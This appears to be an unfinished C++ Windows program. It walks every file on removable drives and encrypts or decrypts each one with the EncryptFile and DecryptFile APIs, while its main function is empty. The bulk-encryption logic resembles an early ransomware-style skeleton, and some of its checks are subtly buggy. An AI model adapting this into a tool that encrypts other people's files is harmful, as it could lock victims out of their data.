#include<Windows.h>
#include <iostream>
#include<filesystem>
#include<vector>
#include <atlstr.h>
#include"ZeD_Crypto.h"



void get_files(std::vector<std::filesystem::path>& paths, LPCTSTR root_path)  //get all files in root dir
{
	CStringA stringA(root_path);
	const char* const_char_root_path = stringA;
	char* char_root_path = const_cast<char*>(const_char_root_path);
	for (const auto& file : std::filesystem::directory_iterator(const_char_root_path))
	{
		if ( std::filesystem::is_directory(file) )
		{
			get_files(paths, file.path().string().c_str());
		}
		else
		{
			paths.push_back(file.path().string());
		}
	}
}

void fill_paths( std::vector<std::filesystem::path>& paths ) // fill vector of paths with all full path in root dir
{
	TCHAR sz_buffer[256];
	LPCTSTR buffer_ptr = sz_buffer;
	GetLogicalDriveStrings(255, sz_buffer);

	for (buffer_ptr; *buffer_ptr != '\0'; buffer_ptr += _tcsclen(sz_buffer) + 1)
	{
		if ( GetDriveType(buffer_ptr) == DRIVE_REMOVABLE )
		{
			std::wcout << buffer_ptr;
			std::cout << "Removable drive \n ----------------\n";
			get_files(paths, buffer_ptr);
		}
		else if( GetDriveType(buffer_ptr) == DRIVE_FIXED) 
		{
			std::wcout << buffer_ptr;
			std::cout << "Fixed drive \n ----------------\n";
			continue;
		}
	}
}

bool readonly_check(const std::vector<std::filesystem::path>& paths)
{
	DWORD file_attr;

	for (size_t i = 0; i < paths.size(); ++i)
	{
		file_attr = GetFileAttributes(paths[i].string().c_str());
		if (file_attr == FILE_ATTRIBUTE_READONLY)
		{
			return false;
		}
	}
	return true;
}

DWORD encrypt(const std::vector<std::filesystem::path>& paths)
{
	for (size_t i = 0; i < paths.size(); ++i)
	{
		if ( !EncryptFile(paths[i].string().c_str()) )
		{
			if ( GetLastError() == ERROR_FILE_READ_ONLY )
			{
				std::cout << paths[i] << "READONLY FILE ERROR\n";
				//return GetLastError();
				continue;
			}
			//return GetLastError();
			continue;
		}
	}
	return GetLastError();
}
DWORD decrypt(const std::vector<std::filesystem::path>& paths)
{
	
	for (size_t i = 0; i < paths.size(); ++i)
	{
		if ( !DecryptFile( paths[i].string().c_str(), NULL) )
		{
			if ( GetLastError() == ERROR_FILE_READ_ONLY )
			{
				std::cout << paths[i] << " - READONLY FILE \n";
				//return GetLastError();
				continue;
			}
			//return GetLastError();
			continue;
		}
	}
	return GetLastError();
}
int main()
{

	  
}


